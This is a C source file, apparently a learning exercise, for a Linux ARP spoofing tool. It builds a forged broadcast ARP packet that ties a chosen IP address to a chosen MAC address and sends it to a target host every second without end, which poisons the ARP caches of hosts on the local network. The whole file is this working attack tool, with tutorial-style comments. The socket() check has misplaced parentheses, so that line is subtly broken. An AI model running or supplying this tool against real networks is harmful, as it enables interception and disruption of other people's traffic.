#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>

#include "../ARPLIB/arplib.h"

enum {
    ARGV_CMD, //0
    ARGV_INTERFACE, //1
    ARGV_TARGET_IP, //2
    ARGV_SPOOF_IP, //3
    ARGV_SPOOF_MAC //4
};
// Only Linux Available
int main(int argc,char **argv) {
    //If Raw Socket, should include linked-level header (sockaddr_ll)
    //If you want to get interface information, use ifreq structure
    //Raw socket should include sockaddr_ll (linked-level header)
    struct sockaddr_ll sll; //Address types The sockaddr_ll structure is a device-independent physical-layer address.
    struct ifreq ifr; // ifreq is used to configure and obtain interface information such as ip address, mask, and MTU.
    struct arp_packet arp_packet; //arp packet
    int sock, arp_source_ip, arp_target_ip;

    unsigned char buffer_mac[6];
    unsigned char anymac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char *arp_source_mac, *ether_source_mac, *ether_dest_mac;

    if (argc != 5) {
        printf("Usage : %s [interface][Target IP][IP][MAC]\n", argv[0]);
        return 1;
    }
    if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) < 0)) {
        perror("socket");
        return 1;
    }
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, argv[1]);
    //ioctl (an abbreviation of input/output control) is a system call for device-specific input/output operations
    // and other operations which cannot be expressed by regular system calls
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { //get Index of name of interface in Socket, and store it in ifr
        perror("ioctl");
        return 1;
    }
    memset(&sll, 0x00, sizeof(sll));
    sll.sll_family = PF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex; //we got index number for the interface.
    sll.sll_protocol = htons(ETH_P_ALL);
    //ARP + Ethernet setting
    arp_source_ip = inet_addr(argv[ARGV_SPOOF_IP]); //ip address
    arp_target_ip = inet_addr(argv[ARGV_TARGET_IP]); //target address

    strmac_to_buffer(argv[ARGV_SPOOF_MAC], buffer_mac); //copy Mac address ( user typed)

    ether_dest_mac = anymac; //board cast 0xffffff
    ether_source_mac = arp_source_mac = buffer_mac; //setting mac address into ethernet and arp protocol
    //make ether net protocol
    make_ether_header(
            &(arp_packet.ether_header),
            ether_dest_mac, ether_source_mac, ETHERTYPE_ARP
    );
    //make arp protocol
    make_arp_header(
            &(arp_packet.ether_arp), arp_source_mac, arp_source_ip,
            NULL, arp_target_ip, 1 //ARP request
    );
    //looping
    while (1) {
        if (sendto(sock, &arp_packet, sizeof(arp_packet), 0, //sendto target address that " I am my Ip is ~~ MAC address is ~~"
                   (struct sockaddr *) &sll, sizeof(sll)) < 0) {
            perror("sendto ");
            break;
        }
        sleep(1);
    }
return 0;
}